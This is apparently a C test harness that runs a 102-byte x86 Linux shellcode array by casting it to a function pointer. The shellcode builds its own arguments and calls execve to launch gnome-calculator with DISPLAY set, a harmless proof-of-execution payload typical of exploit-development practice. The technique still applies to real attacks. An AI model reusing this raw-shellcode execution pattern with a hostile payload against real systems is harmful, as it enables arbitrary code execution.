int main()
{
    unsigned char shellcode[] = {
	0xeb, 0x2a, 0x31, 0xc0, 0x5b, 0x88, 0x43, 0x19, 0x89, 0x5b, 0x1a, 0x89,
	0x43, 0x1e, 0x8d, 0x7b, 0x2a, 0x89, 0x7b, 0x22, 0x89, 0x43, 0x26, 0x88,
	0x43, 0x34, 0x8d, 0x4b, 0x1a, 0x8d, 0x53, 0x22, 0xb0, 0x0b, 0xcd, 0x80,
	0x31, 0xc0, 0xb0, 0x01, 0x31, 0xdb, 0xcd, 0x80, 0xe8, 0xd1, 0xff, 0xff,
	0xff, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x67, 0x6e,
	0x6f, 0x6d, 0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c, 0x61, 0x74,
	0x6f, 0x72, 0x41, 0x42, 0x42, 0x42, 0x42, 0x43, 0x43, 0x43, 0x43, 0x44,
	0x44, 0x44, 0x44, 0x45, 0x45, 0x45, 0x45, 0x44, 0x49, 0x53, 0x50, 0x4c,
	0x41, 0x59, 0x3d, 0x3a, 0x30, 0x46
    };
    unsigned int shellcode_len = 102;

    void (*f)() = (void (*)())shellcode;
    f();
}
